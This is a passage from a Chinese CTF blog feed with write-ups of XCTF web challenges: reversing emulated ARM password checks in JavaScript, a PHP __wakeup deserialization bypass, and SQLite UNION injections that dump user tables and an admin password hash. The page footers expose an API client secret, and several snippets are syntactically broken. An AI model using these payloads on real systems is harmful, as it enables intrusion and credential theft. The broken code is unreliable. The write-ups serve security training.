<p>4.在secret.js里找到enc_pw(),get_pw(),test_pw()三个函数，分别看他们产生的作用。<br> 4_1.enc_pw():<br> (1)利用Unicorn.js创建的模拟cpu实现ARM架构的加密<br> (2)根据代码将数值循环加密，将 o2数组内的内容加密后写入内存(保存为 _[o2[a]])<br> (3)且enc_pw()返回一个固定值，与测试输入无关<br> <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(var a=0;a&lt;o2.length;a++)R.mem_write(t+a,[_[o2[a]]]);</span><br></pre></td></tr></table></figure></div><br> (4)根据原函数在浏览器控制台进行加密模拟，构造enc_pw()的加密过程函数（注：只在linux环境下会生成正确的加密模拟，原因尚在查）</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">getARM1</span></span>()&#123;</span><br><span class="line">	var x =stoh(atob(getBase64Image(<span class="string">"frei"</span>)));</span><br><span class="line">	var output = new Array();</span><br><span class="line">	<span class="keyword">for</span>(var i =0;i&lt;o2.length ;i++)&#123;</span><br><span class="line">		output[i]= x[o2[i]];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">return</span> output;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p> 同时根据wp参考，只有hex to ARM的在线转化，因此将生成的十进制转化为16进制</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> toHexString(res)&#123;</span><br><span class="line">	<span class="built_in">return</span> Array.from(res),<span class="keyword">function</span>(byte)&#123;</span><br><span class="line">		<span class="built_in">return</span> (<span class="string">'0'</span> + (byte &amp; 0xFF).toString(16)).slice(-2);</span><br><span class="line">	&#125;).join(<span class="string">''</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p> (5)运行代码toHexString(getARM1()),获得加密过程中的16进制字符串<br> (6)<a href='http://armconverter.com/hextoarm/' target="_blank">在线hex to ARM</a><br><br> 获得汇编代码：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">MOV	R0, R8					;R0 -&gt; 8192</span><br><span class="line">MOV	R1, SB					;sb/SB(静态基址寄存器，与R9同义)，所以R1=R9 -&gt; 12288</span><br><span class="line">MOV	R2, SL					;sl/SL(堆栈限制寄存器)，R2=R10 -&gt; e.length ,e为user input</span><br><span class="line">MOV	R3, <span class="comment">#0					；R3 -&gt; 0</span></span><br><span class="line">MOV	R5, <span class="comment">#0					; R5 -&gt; 0</span></span><br><span class="line">LDRB	R4, [R0]            ;LDRB:字节数据加载指令，将存储器地址为R0的地址加载到R4，并将R0的高24位清空  adress:0x14</span><br><span class="line">CMP	R5, <span class="comment">#1					;比较R5 与 #1</span></span><br><span class="line">BNE	<span class="comment">#0x28					;若R5 ！= #1，则跳转到 address(0x28)</span></span><br><span class="line">AND	R6, R3, <span class="comment">#3				;R3与#3进行 逻辑与运算，结果存入R6</span></span><br><span class="line">ADD	R4, R4, R6				；R4 = R4 + R6</span><br><span class="line">ADD	R4, R4, <span class="comment">#6				；R4 = R4 + 6   address:0x28</span></span><br><span class="line">AND	R5, R4, <span class="comment">#1				; R4与#1 与逻辑运算，结果代入R5</span></span><br><span class="line">STRB	R4, [R1]			;字节数据存储指令，将源寄存器R1中的低8位字节存入R4</span><br><span class="line">ADD	R0, R0, <span class="comment">#1				；R0 = R0 +1</span></span><br><span class="line">ADD	R1, R1, <span class="comment">#1				；R1 = R1 +1</span></span><br><span class="line">ADD	R3, R3, <span class="comment">#1				；R3 = R3 +1</span></span><br><span class="line">CMP	R3, R2					；比较R3与R2</span><br><span class="line">BLT	<span class="comment">#0x14					；如果R3&lt;R2 ,跳转到address(0x14)，否则无视</span></span><br><span class="line">MOV	R0, <span class="comment">#0</span></span><br><span class="line">MOV	R1, <span class="comment">#0</span></span><br><span class="line">MOV	R2, <span class="comment">#0</span></span><br><span class="line">MOV	R3, <span class="comment">#0</span></span><br><span class="line">MOV	R4, <span class="comment">#0</span></span><br><span class="line">MOV	R5, <span class="comment">#0</span></span><br><span class="line">MOV	R6, <span class="comment">#0</span></span><br><span class="line">MOV	R7, <span class="comment">#0</span></span><br><span class="line">MOV	SB, <span class="comment">#0</span></span><br><span class="line">MOV	SL, <span class="comment">#0</span></span><br></pre></td></tr></table></figure></div>
<p> 4_2.test_pw():<br> (1)同理构造test_pw()的加密过程函数</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">getARM2</span></span>()&#123;</span><br><span class="line">	var x =stoh(atob(getBase64Image(<span class="string">"eye"</span>)));</span><br><span class="line">	var output = new Array();</span><br><span class="line">	<span class="keyword">for</span>(var i =0;i&lt;o1.length ;i++)&#123;</span><br><span class="line">		output[i]= x[o1[i]];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">return</span> output;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p> (2)运行代码toHexString(getARM2()),获得加密过程中的16进制字符串<br> (3)<a href='http://armconverter.com/hextoarm/' target="_blank">在线hex to ARM</a><br><br> 获得汇编代码：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">MOV	R0, SB				;R0=R9 -&gt; 8192</span><br><span class="line">MOV	R1, SL				;R1=R10 -&gt; 12288</span><br><span class="line">MOV	R3, R8				;R3 = R8 = _.length</span><br><span class="line">MOV	R4, <span class="comment">#0				;R4 -&gt; 0</span></span><br><span class="line">MOV	R5, <span class="comment">#0				;R5 -&gt; 0</span></span><br><span class="line">MOV	IP, <span class="comment">#0				;ip/IP(过程调用中的临时寄存器，与R12同义) R12 -&gt; 0</span></span><br><span class="line">LDRB	R2, [R0]		；address(0x18)</span><br><span class="line">LDRB	R6, [R1]		</span><br><span class="line">ADD	R6, R6, <span class="comment">#5			;R6 = R6 + 5</span></span><br><span class="line">AND	IP, R4, <span class="comment">#1			;R4与#1逻辑与比较，并存入IP</span></span><br><span class="line">CMP	IP, <span class="comment">#0				；比较IP与0</span></span><br><span class="line">BEQ	<span class="comment">#0x34				；如果IP = 0 ，则跳转到address(0x34)</span></span><br><span class="line">SUB	R6, R6, <span class="comment">#3			;R6 =R6 - 3</span></span><br><span class="line">CMP	R2, R6				;比较R2，R6		address(0x34)</span><br><span class="line">BNE	<span class="comment">#0x54				；如果R2 ！= R6 ，跳转至 address(0x54)</span></span><br><span class="line">ADD	R0, R0, <span class="comment">#1			;R0 = R0 + 1</span></span><br><span class="line">ADD	R1, R1, <span class="comment">#1			;R1 = R1 + 1</span></span><br><span class="line">ADD	R4, R4, <span class="comment">#1			;R4 = R4 + 1</span></span><br><span class="line">CMP	R4, R3				；比较R4，R3</span><br><span class="line">BLT	<span class="comment">#0x18				；如果R4 &lt; R3 跳转至address(0x18)</span></span><br><span class="line">MOV	R5, <span class="comment">#1				</span></span><br><span class="line">MOV	R0, <span class="comment">#0				;address(0x54)</span></span><br><span class="line">MOV	R1, <span class="comment">#0</span></span><br><span class="line">MOV	R2, <span class="comment">#0</span></span><br><span class="line">MOV	R3, <span class="comment">#0</span></span><br><span class="line">MOV	R4, <span class="comment">#0</span></span><br><span class="line">MOV	R6, <span class="comment">#0</span></span><br><span class="line">MOV	R7, <span class="comment">#0</span></span><br><span class="line">MOV	R8, <span class="comment">#0</span></span><br><span class="line">MOV	SB, <span class="comment">#0</span></span><br><span class="line">MOV	SL, <span class="comment">#0</span></span><br><span class="line">MOV	IP, <span class="comment">#0</span></span><br></pre></td></tr></table></figure></div>

<p>5.已知functon login函数：<br>    当test_pw(enc_pw(document.getElementById(‘password’).value) , get_pw()) == 1 时，可获得flag。<br> 5_1.构建enc_pw()与test_pw()的代码逻辑图：<br> (1)enc_pw():<br><img src="2.png" alt=""><br> (2)构建逆向js代码：( i-&gt;R3; x-&gt;R4; test-&gt;R5; sub-&gt;R6 )</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> encRev(args)&#123;</span><br><span class="line">	var <span class="built_in">test</span> = 0;</span><br><span class="line">	var output = new Array();</span><br><span class="line">	<span class="keyword">for</span>(var i= 0;i&lt; args.length ;i++)&#123;</span><br><span class="line">		var x = args[i];			//原函数 LDRB R4 [R0]</span><br><span class="line">		<span class="keyword">if</span>(<span class="built_in">test</span> == 1)&#123;				//原函数 CMP R5 <span class="comment">#1</span></span><br><span class="line">			var sub = (i &amp; 3);		//原函数 AND	R6, R3, <span class="comment">#3</span></span><br><span class="line">			x= x-sub;               //原函数 R4 = R4 + R6</span><br><span class="line">		&#125;</span><br><span class="line">		x= x - 6;					//原函数 R4 = R4 + 6</span><br><span class="line">		<span class="built_in">test</span> = (args[i] &amp; 1)；		//原函数 STRB	R4, [R1]</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">return</span> output;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p> (3)test_PW():<br><img src="3.png" alt=""><br> (4)构建test_PW()的逆向JS代码：( i-&gt;R4; a-&gt;R6 )<br> 因为test_pw()中进行了get_pw()的比对，所以先利用控制台求出get_pw()为XYzaSAAX_PBssisodjsal_sSUVWZYYYb</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">unction <span class="function"><span class="title">testRev</span></span>()&#123;</span><br><span class="line">	var pw =stoh(<span class="string">"XYzaSAAX_PBssisodjsal_sSUVWZYYYb"</span>); //get_pw()的返回值</span><br><span class="line">	var required = new Array();					</span><br><span class="line">	<span class="keyword">for</span>( var i = 0; i &lt; pw.length; i++)&#123;</span><br><span class="line">		var a = pw[i];</span><br><span class="line">		a = a-5;						//原函数 R6 = R6 + 5</span><br><span class="line">		<span class="keyword">if</span>(i &amp; 1 == 1)&#123;					//原函数 比较IP</span><br><span class="line">			a = a +3;					//原函数 R6 =R6 - 3</span><br><span class="line">		&#125;</span><br><span class="line">		required[i] = a;				</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">return</span> required;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p> (5)控制台运行htos(encRev(testRev()))即可得到flag</p>
<div class="note info"><p>0x03 参考</p></div>
1.<a href="https://www.guildhab.top/?p=508" target="_blank" >web-Triangle:https://www.guildhab.top/?p=508</a><br>



<br>
<br>

<!-- Link Gitalk 的支持文件  -->
<link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
<script src="https://unpkg.com/gitalk@latest/dist/gitalk.min.js"></script> 
<div id="gitalk-container"></div>     <script type="text/javascript">
    var gitalk = new Gitalk({

<pre><code>// gitalk的主要参数
    clientID: &apos;dcf239aa6b46fcf244a3&apos;,
    clientSecret: &apos;2b92cc0f958358e2c10b5fb8746381c15f5ee29d&apos;,
    repo: &apos;MR-eggegg.github.io&apos;,
    owner: &apos;MR-eggegg&apos;,
    admin: [&apos;MR-eggegg&apos;],
    id: &apos;页面的唯一标识，gitalk会根据这个标识自动创建的issue的标签&apos;,

});
gitalk.render(&apos;gitalk-container&apos;);</code></pre><p></script></p>
]]></content>
      
        <categories>
            
            <category> CTF-WEB </category>
            
        </categories>
        
        
        <tags>
            
            <tag> JS逆向 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[CTF攻防世界-WEB-php2]]></title>
      <url>/2019/12/31/ctf-web-php2/</url>
      <content type="html"><![CDATA[<div class="note info"><p>0x01 前要</p></div>
1.PHP序列化与反序列化 </br>


<a id="more"></a>

<div class="note info"><p>0x02 解题流程与思路</p></div>
1.打开网页，目录遍历，注入也没什么变化，分析代码
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">class xctf&#123;</span><br><span class="line">public <span class="variable">$flag</span> = <span class="string">'111'</span>;</span><br><span class="line">public <span class="keyword">function</span> <span class="function"><span class="title">__wakeup</span></span>()&#123;</span><br><span class="line"><span class="built_in">exit</span>(<span class="string">'bad requests'</span>);</span><br><span class="line">&#125;</span><br><span class="line">?code=</span><br></pre></td></tr></table></figure></div>

<p>2.懂不懂无所谓，边学边做，看见不懂的函数，查它！<br> 2_1.所以我们的关注点 _wakeup(),一查果然查出点东西，详细的说明可以看我给的参考，此题利用反序列化绕过wakeup获得flag。</p>
 </br>
3.对源代码进行加工
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class xctf&#123;</span><br><span class="line">public <span class="variable">$flag</span> = <span class="string">'111'</span>;</span><br><span class="line">public <span class="keyword">function</span> <span class="function"><span class="title">__wakeup</span></span>()&#123;</span><br><span class="line"><span class="built_in">exit</span>(<span class="string">'bad requests'</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$c</span> = new xctf();</span><br><span class="line"><span class="variable">$a</span> = serialize(<span class="variable">$c</span>);</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$a</span>;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></div>

</br>
 3_1.改写php文件重新打开,得出结果
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:<span class="string">"xctf"</span>:1:&#123;s:4:<span class="string">"flag"</span>;s:3:<span class="string">"111"</span>;&#125;</span><br></pre></td></tr></table></figure></div>

<p>4.得到序列，根据wakeup绕过原理，随意改写，使得属性与真实属性不符。然后进行payload得到flag。</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:<span class="string">"xctf"</span>:2:&#123;s:4:<span class="string">"flag"</span>;s:3:<span class="string">"111"</span>;&#125;</span><br></pre></td></tr></table></figure></div>

<p>====&gt;重新构造</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=O:4:<span class="string">"xctf"</span>:2:&#123;s:4:<span class="string">"flag"</span>;s:3:<span class="string">"111"</span>;&#125;</span><br></pre></td></tr></table></figure></div>


<br>
<div class="note info"><p>0x03 参考</p></div>
1.<a href='https://www.php.net/manual/zh/language.oop5.serialization.php' target="_blank">序列化对象 - 在会话中存放对象:https://www.php.net/manual/zh/language.oop5.serialization.php</a><br>







<br>
<br>

<!-- Link Gitalk 的支持文件  -->
<link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
<script src="https://unpkg.com/gitalk@latest/dist/gitalk.min.js"></script> 
<div id="gitalk-container"></div>     <script type="text/javascript">
    var gitalk = new Gitalk({

<pre><code>// gitalk的主要参数
    clientID: &apos;dcf239aa6b46fcf244a3&apos;,
    clientSecret: &apos;2b92cc0f958358e2c10b5fb8746381c15f5ee29d&apos;,
    repo: &apos;MR-eggegg.github.io&apos;,
    owner: &apos;MR-eggegg&apos;,
    admin: [&apos;MR-eggegg&apos;],
    id: &apos;页面的唯一标识，gitalk会根据这个标识自动创建的issue的标签&apos;,

});
gitalk.render(&apos;gitalk-container&apos;);</code></pre><p></script></p>
]]></content>
      
        <categories>
            
            <category> CTF-WEB </category>
            
        </categories>
        
        
        <tags>
            
            <tag> PHP序列化与反序列化：魔术方法 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[CTF攻防世界-WEB-FlatScience]]></title>
      <url>/2019/12/30/ctf-web-FlatScience/</url>
      <content type="html"><![CDATA[<div class="note info"><p>0x01 前要</p></div>
1.网页目录遍历 or robots协议<br>
2.SQL注入之sqlite数据库<br>
3.python 爬取PDF，python 扫描比对PDF文本找出密码之sha1，md5解密

<a id="more"></a>
<br>
<div class="note info"><p>0x02 解题流程与思路</p></div>
1.拿到网页，日常扫描。或者进robots.txt查看，CTF-web解题日常操作。根据扫描或者robots协议的信息，我们可知网页存在admin.php和login.php。
![](1.PNG)
<br>
2.尝试操作admin.php和login.php因为admin.php进行任何操作都没有回执，尝试操作login.php<br>
 2_1.admin' 进行SQL注入尝试，服务器返回报错。从报错信息中我们可以得知该服务器为SQLite3数据库，也就是我们可能无法通过注入database来获取信息。
<br>
3.查看网页源代码，其中有一段： TODO: Remove ?debug-Parameter! 。所以我们更改url：login.php?debug,这样我们就可以看到PHP的信息
<br>

<details>
<summary>得到的php     展开/折叠</summary>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">if(isset($_POST[&#39;usr&#39;]) &amp;&amp; isset($_POST[&#39;pw&#39;]))&#123;</span><br><span class="line">        $user &#x3D; $_POST[&#39;usr&#39;];</span><br><span class="line">        $pass &#x3D; $_POST[&#39;pw&#39;];</span><br><span class="line"></span><br><span class="line">        $db &#x3D; new SQLite3(&#39;..&#x2F;fancy.db&#39;);</span><br><span class="line">        </span><br><span class="line">        $res &#x3D; $db-&gt;query(&quot;SELECT id,name from Users where name&#x3D;&#39;&quot;.$user.&quot;&#39; and password&#x3D;&#39;&quot;.sha1($pass.&quot;Salz!&quot;).&quot;&#39;&quot;);</span><br><span class="line">    if($res)&#123;</span><br><span class="line">        $row &#x3D; $res-&gt;fetchArray();</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        echo &quot;&lt;br&gt;Some Error occourred!&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if(isset($row[&#39;id&#39;]))&#123;</span><br><span class="line">            setcookie(&#39;name&#39;,&#39; &#39;.$row[&#39;name&#39;], time() + 60, &#39;&#x2F;&#39;);</span><br><span class="line">            header(&quot;Location: &#x2F;&quot;);</span><br><span class="line">            die();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#39;debug&#39;]))</span><br><span class="line">highlight_file(&#39;login.php&#39;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></div>
</details>
<br>
4.查看代码可知：数据库内存在 name，password，且进行了sha1加密。
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$res</span> = <span class="variable">$db</span>-&gt;query(<span class="string">"SELECT id,name from Users where name='"</span>.<span class="variable">$user</span>.<span class="string">"' and password='"</span>.sha1(<span class="variable">$pass</span>.<span class="string">"Salz!"</span>).<span class="string">"'"</span>);</span><br></pre></td></tr></table></figure></div>
<br>

<p>5.仍然尝试注入，根据已知情报修改注入内容。</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">' union select name,sql from sqlite_master--+&amp;pw=</span></span><br></pre></td></tr></table></figure></div>
<p><img src="2.PNG" alt=""><br>6.分解我们得到的set-cookie</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">=+CREATE+TABLE+Users%28id+int+primary+key%2Cname+varchar%28255%29%2Cpassword+varchar%28255%29%2Chint+varchar%28255%29%29</span><br></pre></td></tr></table></figure></div>
<p> 6_1.===&gt;这时，我们就可以知道表名，与表内内容</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE Users(</span><br><span class="line">	id int primary key,</span><br><span class="line">	name varchar(255),</span><br><span class="line">	password varchar(255),</span><br><span class="line">	hint varchar(255)</span><br><span class="line">)</span><br></pre></td></tr></table></figure></div>
<br>

<p>7.根据表名，内容构造SQL注入</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">查询用户的SQL：usr=%27 UNION SELECT id, name from Users --+&amp;pw=</span><br><span class="line">查询密码的SQL：usr=%27 UNION SELECT id, password from Users--+&amp;pw=</span><br><span class="line">查询隐藏内容的SQL：usr=%27 UNION SELECT id, hint from Users--+&amp;pw=</span><br></pre></td></tr></table></figure></div>
<p> 7_1.分别得出：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">id:admin</span><br><span class="line">password:3fab54a50e770d830c0416df817567662a9dc85c</span><br><span class="line">hint:my+fav+word+<span class="keyword">in</span>+my+fav+paper%3F%2</span><br></pre></td></tr></table></figure></div>
<p>8.其实到这里，因为之前已经知道密码存在sha1加密，我们直接拿着密码去 MD5解密得到解密后的密码就可以直接去admin.php登陆获得flag。不知道是不是当初设计上的漏送，导致这题只有1星，实际上从答题人数和麻烦程度来说远不止1星。<br><img src="3.PNG" alt=""><br><br><br>9.闲着无聊，并不想那么轻易的答题，尝试出题人的正常解题方式答题。<br> 9_1.我们在最开始进入网页的时候，可以看到非常多的PDF文件，根据第7步骤的hint隐藏线索的显示，出提人是想让我们从大量的PDF中找出密码。<br> 9_2.虽然是web渗透方向的题目，我们确实也可以一个一个点下载获得PDF，不过作为一个猿，我在网上找了很多爬取PDF的python代码，因为2020年1月开始，py2的代码不再被py3向下兼容，我就把代码改装成py3的代码，并加上了多网页爬取PDF。<br><img src="4.PNG" alt=""></p>
<details>
<summary>python3爬取多目标网页PDF文件并下载到指定目录     展开/折叠</summary>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">import urllib.request</span><br><span class="line">import re</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># open the url and read</span><br><span class="line">def getHtml(url):</span><br><span class="line">    page &#x3D; urllib.request.urlopen(url)</span><br><span class="line">    html &#x3D; page.read()</span><br><span class="line">    page.close()</span><br><span class="line">    return html</span><br><span class="line"></span><br><span class="line">def getUrl(html):</span><br><span class="line">    reg &#x3D; r&#39;(?:href|HREF)&#x3D;&quot;?((?:http:&#x2F;&#x2F;)?.+?\.pdf)&#39;</span><br><span class="line">    url_re &#x3D; re.compile(reg)</span><br><span class="line">    url_lst &#x3D; url_re.findall(html.decode(&#39;utf-8&#39;))</span><br><span class="line">    return(url_lst)</span><br><span class="line"></span><br><span class="line">def getFile(url):</span><br><span class="line">    file_name &#x3D; 